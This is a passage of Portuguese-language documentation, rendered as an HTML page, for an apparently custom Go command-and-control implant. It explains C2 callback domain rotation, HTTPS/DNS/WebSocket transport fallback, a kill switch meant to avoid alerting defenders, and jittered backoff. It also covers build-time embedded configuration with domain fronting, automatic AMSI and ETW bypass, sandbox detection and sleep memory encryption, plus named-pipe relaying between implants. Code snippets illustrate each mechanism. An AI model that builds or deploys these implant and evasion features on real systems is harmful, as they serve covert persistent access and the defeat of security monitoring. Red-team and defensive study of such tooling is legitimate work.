+<h3 id="1-domain-rotation">1. Domain Rotation<a class="headerlink" href="#1-domain-rotation" title="Permanent link">¶</a></h3>
+<p>Cada falha rota para a proxima callback URL:</p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-10-1" id="__codelineno-10-1" name="__codelineno-10-1"></a><span class="c1">// Configuracao: CallbackURLs = ["https://c2-1.example.com", "https://c2-2.example.com"]</span>
+<a href="#__codelineno-10-2" id="__codelineno-10-2" name="__codelineno-10-2"></a><span class="k">if</span><span class="w"> </span><span class="nb">len</span><span class="p">(</span><span class="nx">r</span><span class="p">.</span><span class="nx">urls</span><span class="p">)</span><span class="w"> </span><span class="p">&gt;</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-10-3" id="__codelineno-10-3" name="__codelineno-10-3"></a><span class="w">    </span><span class="nx">r</span><span class="p">.</span><span class="nx">currentURLIdx</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="p">(</span><span class="nx">r</span><span class="p">.</span><span class="nx">currentURLIdx</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="nb">len</span><span class="p">(</span><span class="nx">r</span><span class="p">.</span><span class="nx">urls</span><span class="p">)</span>
+<a href="#__codelineno-10-4" id="__codelineno-10-4" name="__codelineno-10-4"></a><span class="p">}</span>
+</code></pre></div>
+<h3 id="2-transport-fallback">2. Transport Fallback<a class="headerlink" href="#2-transport-fallback" title="Permanent link">¶</a></h3>
+<p>Apos N falhas consecutivas (default 10) no transport atual, troca para o proximo na chain:</p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-11-1" id="__codelineno-11-1" name="__codelineno-11-1"></a><span class="k">if</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">consecutiveFailures</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">maxTransportFailures</span><span class="p">()</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">chainLen</span><span class="w"> </span><span class="p">&gt;</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-11-2" id="__codelineno-11-2" name="__codelineno-11-2"></a><span class="w">    </span><span class="nx">r</span><span class="p">.</span><span class="nx">currentTransportIdx</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="p">(</span><span class="nx">r</span><span class="p">.</span><span class="nx">currentTransportIdx</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="nx">chainLen</span>
+<a href="#__codelineno-11-3" id="__codelineno-11-3" name="__codelineno-11-3"></a><span class="w">    </span><span class="nx">r</span><span class="p">.</span><span class="nx">consecutiveFailures</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="c1">// reset per-transport</span>
+<a href="#__codelineno-11-4" id="__codelineno-11-4" name="__codelineno-11-4"></a><span class="p">}</span>
+</code></pre></div>
+<p>Exemplo: HTTPS falha 10 vezes -&gt; troca para DNS -&gt; DNS falha 10 vezes -&gt; troca para WS -&gt; ...</p>
+<h3 id="3-kill-switch">3. Kill Switch<a class="headerlink" href="#3-kill-switch" title="Permanent link">¶</a></h3>
+<p>Se o total de falhas (across all transports) excede o threshold (default 100), o implant termina:</p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-12-1" id="__codelineno-12-1" name="__codelineno-12-1"></a><span class="kd">var</span><span class="w"> </span><span class="nx">ErrKillSwitch</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">errors</span><span class="p">.</span><span class="nx">New</span><span class="p">(</span><span class="s">"implant: kill switch triggered"</span><span class="p">)</span>
+<a href="#__codelineno-12-2" id="__codelineno-12-2" name="__codelineno-12-2"></a>
+<a href="#__codelineno-12-3" id="__codelineno-12-3" name="__codelineno-12-3"></a><span class="kd">func</span><span class="w"> </span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="o">*</span><span class="nx">Reconnector</span><span class="p">)</span><span class="w"> </span><span class="nx">RecordFailure</span><span class="p">()</span><span class="w"> </span><span class="kt">error</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-12-4" id="__codelineno-12-4" name="__codelineno-12-4"></a><span class="w">    </span><span class="nx">r</span><span class="p">.</span><span class="nx">totalFailures</span><span class="o">++</span>
+<a href="#__codelineno-12-5" id="__codelineno-12-5" name="__codelineno-12-5"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">totalFailures</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">maxTotalFailures</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-12-6" id="__codelineno-12-6" name="__codelineno-12-6"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">ErrKillSwitch</span>
+<a href="#__codelineno-12-7" id="__codelineno-12-7" name="__codelineno-12-7"></a><span class="w">    </span><span class="p">}</span>
+<a href="#__codelineno-12-8" id="__codelineno-12-8" name="__codelineno-12-8"></a><span class="w">    </span><span class="c1">// ...</span>
+<a href="#__codelineno-12-9" id="__codelineno-12-9" name="__codelineno-12-9"></a><span class="p">}</span>
+</code></pre></div>
+<p>O kill switch previne que um implant "preso" fique gerando trafego indefinidamente, o que poderia alertar defensores.</p>
+<h3 id="exponential-backoff">Exponential Backoff<a class="headerlink" href="#exponential-backoff" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-13-1" id="__codelineno-13-1" name="__codelineno-13-1"></a><span class="kd">func</span><span class="w"> </span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="o">*</span><span class="nx">Reconnector</span><span class="p">)</span><span class="w"> </span><span class="nx">BackoffDuration</span><span class="p">()</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span><span class="nx">Duration</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-13-2" id="__codelineno-13-2" name="__codelineno-13-2"></a><span class="w">    </span><span class="nx">base</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nb">float64</span><span class="p">(</span><span class="nx">r</span><span class="p">.</span><span class="nx">cfg</span><span class="p">.</span><span class="nx">Sleep</span><span class="p">)</span>
+<a href="#__codelineno-13-3" id="__codelineno-13-3" name="__codelineno-13-3"></a><span class="w">    </span><span class="nx">exp</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">base</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">math</span><span class="p">.</span><span class="nx">Pow</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="nb">float64</span><span class="p">(</span><span class="nx">r</span><span class="p">.</span><span class="nx">consecutiveFailures</span><span class="p">))</span>
+<a href="#__codelineno-13-4" id="__codelineno-13-4" name="__codelineno-13-4"></a>
+<a href="#__codelineno-13-5" id="__codelineno-13-5" name="__codelineno-13-5"></a><span class="w">    </span><span class="c1">// Cap: max 5 minutos</span>
+<a href="#__codelineno-13-6" id="__codelineno-13-6" name="__codelineno-13-6"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">exp</span><span class="w"> </span><span class="p">&gt;</span><span class="w"> </span><span class="nb">float64</span><span class="p">(</span><span class="nx">r</span><span class="p">.</span><span class="nx">maxBackoffMs</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">exp</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nb">float64</span><span class="p">(</span><span class="nx">r</span><span class="p">.</span><span class="nx">maxBackoffMs</span><span class="p">())</span><span class="w"> </span><span class="p">}</span>
+<a href="#__codelineno-13-7" id="__codelineno-13-7" name="__codelineno-13-7"></a>
+<a href="#__codelineno-13-8" id="__codelineno-13-8" name="__codelineno-13-8"></a><span class="w">    </span><span class="c1">// Jitter: ±25%</span>
+<a href="#__codelineno-13-9" id="__codelineno-13-9" name="__codelineno-13-9"></a><span class="w">    </span><span class="nx">jitterRange</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">exp</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">0.25</span>
+<a href="#__codelineno-13-10" id="__codelineno-13-10" name="__codelineno-13-10"></a><span class="w">    </span><span class="nx">jittered</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">exp</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="nx">rand</span><span class="p">.</span><span class="nx">Float64</span><span class="p">()</span><span class="o">*</span><span class="mi">2</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="nx">jitterRange</span>
+<a href="#__codelineno-13-11" id="__codelineno-13-11" name="__codelineno-13-11"></a>
+<a href="#__codelineno-13-12" id="__codelineno-13-12" name="__codelineno-13-12"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span><span class="nx">Duration</span><span class="p">(</span><span class="nx">math</span><span class="p">.</span><span class="nx">Max</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="w"> </span><span class="nx">jittered</span><span class="p">))</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span><span class="nx">Millisecond</span>
+<a href="#__codelineno-13-13" id="__codelineno-13-13" name="__codelineno-13-13"></a><span class="p">}</span>
+</code></pre></div>
+<p>Com sleep base de 5s e max backoff de 5min:</p>
+<table>
+<thead>
+<tr>
+<th>Falhas</th>
+<th>Backoff base</th>
+<th>Com jitter</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>5s</td>
+<td>3.75-6.25s</td>
+</tr>
+<tr>
+<td>1</td>
+<td>10s</td>
+<td>7.5-12.5s</td>
+</tr>
+<tr>
+<td>2</td>
+<td>20s</td>
+<td>15-25s</td>
+</tr>
+<tr>
+<td>3</td>
+<td>40s</td>
+<td>30-50s</td>
+</tr>
+<tr>
+<td>4</td>
+<td>80s</td>
+<td>60-100s</td>
+</tr>
+<tr>
+<td>5</td>
+<td>160s</td>
+<td>120-200s</td>
+</tr>
+<tr>
+<td>6+</td>
+<td>300s (cap)</td>
+<td>225-375s</td>
+</tr>
+</tbody>
+</table>
+<h2 id="configuracao-embutida-ldflags">Configuracao Embutida (ldflags)<a class="headerlink" href="#configuracao-embutida-ldflags" title="Permanent link">¶</a></h2>
+<p>Toda a configuracao do implant e embutida em build time. Nao existem arquivos de config em disco:</p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-14-1" id="__codelineno-14-1" name="__codelineno-14-1"></a><span class="c1">// cmd/implant/config.go</span>
+<a href="#__codelineno-14-2" id="__codelineno-14-2" name="__codelineno-14-2"></a><span class="kd">var</span><span class="w"> </span><span class="p">(</span>
+<a href="#__codelineno-14-3" id="__codelineno-14-3" name="__codelineno-14-3"></a><span class="w">    </span><span class="nx">buildServerPublicKey</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">""</span><span class="w"> </span><span class="c1">// X25519 pubkey para key pinning</span>
+<a href="#__codelineno-14-4" id="__codelineno-14-4" name="__codelineno-14-4"></a><span class="w">    </span><span class="nx">buildServerURL</span><span class="w">       </span><span class="p">=</span><span class="w"> </span><span class="s">""</span><span class="w"> </span><span class="c1">// callback primario</span>
+<a href="#__codelineno-14-5" id="__codelineno-14-5" name="__codelineno-14-5"></a><span class="w">    </span><span class="nx">buildTransport</span><span class="w">       </span><span class="p">=</span><span class="w"> </span><span class="s">""</span><span class="w"> </span><span class="c1">// "https", "dns", "ws"</span>
+<a href="#__codelineno-14-6" id="__codelineno-14-6" name="__codelineno-14-6"></a><span class="w">    </span><span class="nx">buildSleep</span><span class="w">           </span><span class="p">=</span><span class="w"> </span><span class="s">""</span><span class="w"> </span><span class="c1">// intervalo de check-in (ms)</span>
+<a href="#__codelineno-14-7" id="__codelineno-14-7" name="__codelineno-14-7"></a><span class="w">    </span><span class="nx">buildJitter</span><span class="w">          </span><span class="p">=</span><span class="w"> </span><span class="s">""</span><span class="w"> </span><span class="c1">// porcentagem de jitter</span>
+<a href="#__codelineno-14-8" id="__codelineno-14-8" name="__codelineno-14-8"></a><span class="w">    </span><span class="nx">buildCallbackURLs</span><span class="w">    </span><span class="p">=</span><span class="w"> </span><span class="s">""</span><span class="w"> </span><span class="c1">// URLs extras (comma-separated)</span>
+<a href="#__codelineno-14-9" id="__codelineno-14-9" name="__codelineno-14-9"></a><span class="w">    </span><span class="nx">buildTransportPrio</span><span class="w">   </span><span class="p">=</span><span class="w"> </span><span class="s">""</span><span class="w"> </span><span class="c1">// prioridade de transports</span>
+<a href="#__codelineno-14-10" id="__codelineno-14-10" name="__codelineno-14-10"></a><span class="w">    </span><span class="nx">buildMaxTransFail</span><span class="w">    </span><span class="p">=</span><span class="w"> </span><span class="s">""</span><span class="w"> </span><span class="c1">// falhas antes de trocar transport</span>
+<a href="#__codelineno-14-11" id="__codelineno-14-11" name="__codelineno-14-11"></a><span class="w">    </span><span class="nx">buildMaxTotalFail</span><span class="w">    </span><span class="p">=</span><span class="w"> </span><span class="s">""</span><span class="w"> </span><span class="c1">// falhas antes de kill switch</span>
+<a href="#__codelineno-14-12" id="__codelineno-14-12" name="__codelineno-14-12"></a><span class="w">    </span><span class="nx">buildFrontingDomain</span><span class="w">  </span><span class="p">=</span><span class="w"> </span><span class="s">""</span><span class="w"> </span><span class="c1">// CDN domain para SNI</span>
+<a href="#__codelineno-14-13" id="__codelineno-14-13" name="__codelineno-14-13"></a><span class="w">    </span><span class="nx">buildActualHost</span><span class="w">      </span><span class="p">=</span><span class="w"> </span><span class="s">""</span><span class="w"> </span><span class="c1">// Host header para C2</span>
+<a href="#__codelineno-14-14" id="__codelineno-14-14" name="__codelineno-14-14"></a><span class="w">    </span><span class="nx">buildAutoAMSI</span><span class="w">        </span><span class="p">=</span><span class="w"> </span><span class="s">""</span><span class="w"> </span><span class="c1">// "true" para AMSI bypass automatico</span>
+<a href="#__codelineno-14-15" id="__codelineno-14-15" name="__codelineno-14-15"></a><span class="w">    </span><span class="nx">buildAutoETW</span><span class="w">         </span><span class="p">=</span><span class="w"> </span><span class="s">""</span><span class="w"> </span><span class="c1">// "true" para ETW bypass automatico</span>
+<a href="#__codelineno-14-16" id="__codelineno-14-16" name="__codelineno-14-16"></a><span class="w">    </span><span class="nx">buildAutoSandbox</span><span class="w">     </span><span class="p">=</span><span class="w"> </span><span class="s">""</span><span class="w"> </span><span class="c1">// "true" para sandbox detection</span>
+<a href="#__codelineno-14-17" id="__codelineno-14-17" name="__codelineno-14-17"></a><span class="w">    </span><span class="nx">buildSleepEncrypt</span><span class="w">    </span><span class="p">=</span><span class="w"> </span><span class="s">""</span><span class="w"> </span><span class="c1">// "true" para cifrar memoria no sleep</span>
+<a href="#__codelineno-14-18" id="__codelineno-14-18" name="__codelineno-14-18"></a><span class="w">    </span><span class="nx">buildDynamicModules</span><span class="w">  </span><span class="p">=</span><span class="w"> </span><span class="s">""</span><span class="w"> </span><span class="c1">// "true" para loading sob demanda</span>
+<a href="#__codelineno-14-19" id="__codelineno-14-19" name="__codelineno-14-19"></a><span class="p">)</span>
+</code></pre></div>
+<p>O <code>DefaultConfig()</code> aplica esses overrides:</p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-15-1" id="__codelineno-15-1" name="__codelineno-15-1"></a><span class="kd">func</span><span class="w"> </span><span class="nx">DefaultConfig</span><span class="p">()</span><span class="w"> </span><span class="o">*</span><span class="nx">ImplantConfig</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-15-2" id="__codelineno-15-2" name="__codelineno-15-2"></a><span class="w">    </span><span class="nx">cfg</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">ImplantConfig</span><span class="p">{</span>
+<a href="#__codelineno-15-3" id="__codelineno-15-3" name="__codelineno-15-3"></a><span class="w">        </span><span class="nx">ServerURL</span><span class="p">:</span><span class="w"> </span><span class="s">"https://127.0.0.1:8443"</span><span class="p">,</span>
+<a href="#__codelineno-15-4" id="__codelineno-15-4" name="__codelineno-15-4"></a><span class="w">        </span><span class="nx">Transport</span><span class="p">:</span><span class="w"> </span><span class="s">"https"</span><span class="p">,</span>
+<a href="#__codelineno-15-5" id="__codelineno-15-5" name="__codelineno-15-5"></a><span class="w">        </span><span class="nx">Sleep</span><span class="p">:</span><span class="w">     </span><span class="mi">5000</span><span class="p">,</span>
+<a href="#__codelineno-15-6" id="__codelineno-15-6" name="__codelineno-15-6"></a><span class="w">        </span><span class="nx">Jitter</span><span class="p">:</span><span class="w">    </span><span class="mi">10</span><span class="p">,</span>
+<a href="#__codelineno-15-7" id="__codelineno-15-7" name="__codelineno-15-7"></a><span class="w">        </span><span class="c1">// ...</span>
+<a href="#__codelineno-15-8" id="__codelineno-15-8" name="__codelineno-15-8"></a><span class="w">    </span><span class="p">}</span>
+<a href="#__codelineno-15-9" id="__codelineno-15-9" name="__codelineno-15-9"></a>
+<a href="#__codelineno-15-10" id="__codelineno-15-10" name="__codelineno-15-10"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">buildServerPublicKey</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s">""</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">cfg</span><span class="p">.</span><span class="nx">ServerPublicKey</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">buildServerPublicKey</span><span class="w"> </span><span class="p">}</span>
+<a href="#__codelineno-15-11" id="__codelineno-15-11" name="__codelineno-15-11"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">buildServerURL</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s">""</span><span class="w">       </span><span class="p">{</span><span class="w"> </span><span class="nx">cfg</span><span class="p">.</span><span class="nx">ServerURL</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">buildServerURL</span><span class="w"> </span><span class="p">}</span>
+<a href="#__codelineno-15-12" id="__codelineno-15-12" name="__codelineno-15-12"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">buildAutoAMSI</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s">"true"</span><span class="w">    </span><span class="p">{</span><span class="w"> </span><span class="nx">cfg</span><span class="p">.</span><span class="nx">AutoAMSI</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="kc">true</span><span class="w"> </span><span class="p">}</span>
+<a href="#__codelineno-15-13" id="__codelineno-15-13" name="__codelineno-15-13"></a><span class="w">    </span><span class="c1">// ... etc</span>
+<a href="#__codelineno-15-14" id="__codelineno-15-14" name="__codelineno-15-14"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">cfg</span>
+<a href="#__codelineno-15-15" id="__codelineno-15-15" name="__codelineno-15-15"></a><span class="p">}</span>
+</code></pre></div>
+<p>Isso significa que cada implant gerado e <strong>unico</strong> — tem sua propria configuracao compilada. Nao ha "configuracao padrao" que possa ser extraida de um implant e aplicada a outro.</p>
+<h2 id="pipe-relay">Pipe Relay<a class="headerlink" href="#pipe-relay" title="Permanent link">¶</a></h2>
+<p>Quando <code>PipeListener</code> esta configurado, o implant inicia uma goroutine adicional que aceita conexoes de outros implants via Named Pipe:</p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-16-1" id="__codelineno-16-1" name="__codelineno-16-1"></a><span class="c1">// cmd/implant/main.go</span>
+<a href="#__codelineno-16-2" id="__codelineno-16-2" name="__codelineno-16-2"></a><span class="k">if</span><span class="w"> </span><span class="nx">cfg</span><span class="p">.</span><span class="nx">PipeListener</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s">""</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-16-3" id="__codelineno-16-3" name="__codelineno-16-3"></a><span class="w">    </span><span class="k">go</span><span class="w"> </span><span class="nx">startPipeRelay</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span><span class="w"> </span><span class="nx">cfg</span><span class="p">,</span><span class="w"> </span><span class="nx">session</span><span class="p">,</span><span class="w"> </span><span class="nx">client</span><span class="p">)</span>
+<a href="#__codelineno-16-4" id="__codelineno-16-4" name="__codelineno-16-4"></a><span class="p">}</span>
+</code></pre></div>
+<p>O relay e transparente: envelopes dos child implants passam inalterados para o upstream transport do parent. Cada child tem sua propria session key com o server — o parent nao decifra nada.</p>
+<p>Cenario tipico:</p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-17-1" id="__codelineno-17-1" name="__codelineno-17-1"></a>[Child Implant] --Named Pipe--&gt; [Parent Implant] --HTTPS--&gt; [Server]
+</code></pre></div>
+<p>O child nao precisa de acesso externo. O parent atua como proxy puro.</p>
+<h2 id="veja-tambem">Veja tambem<a class="headerlink" href="#veja-tambem" title="Permanent link">¶</a></h2>
+<ul>
+<li><a href="../protocol/">Protocolo</a> — formato dos envelopes trocados no check-in</li>
+<li><a href="../crypto/">Criptografia</a> — ECDH handshake e session key derivation</li>
+<li><a href="../transport/">Transports</a> — transport chain e fallback</li>
+<li><a href="../modules/">Modulos</a> — modulo registry e dynamic loading</li>
+</ul>
+</article>
+</div>
+<script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+</div>
+<button class="md-top md-icon" data-md-component="top" hidden="" type="button">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"></path></svg>
+  Back to top
+</button>
+</main>
+<footer class="md-footer">
+<div class="md-footer-meta md-typeset">
+<div class="md-footer-meta__inner md-grid">
+<div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" rel="noopener" target="_blank">
+      Material for MkDocs
+    </a>
+</div>
+</div>
+</div>
+</footer>
+</div>
+<div class="md-dialog" data-md-component="dialog">
+<div class="md-dialog__inner md-typeset"></div>
+</div>
+<script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["content.code.copy", "content.tabs.link", "navigation.tabs", "navigation.sections", "navigation.expand", "navigation.top", "navigation.tracking", "navigation.indexes", "toc.integrate", "search.suggest", "search.highlight"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+<script src="../../../assets/javascripts/bundle.79ae519e.min.js"></script>
+<script type="module">import mermaid from "https://unpkg.com/mermaid@10.4.0/dist/mermaid.esm.min.mjs";
+window.mermaidConfig = {default: {
+    startOnLoad: false
+}};</script></body>
+</html>
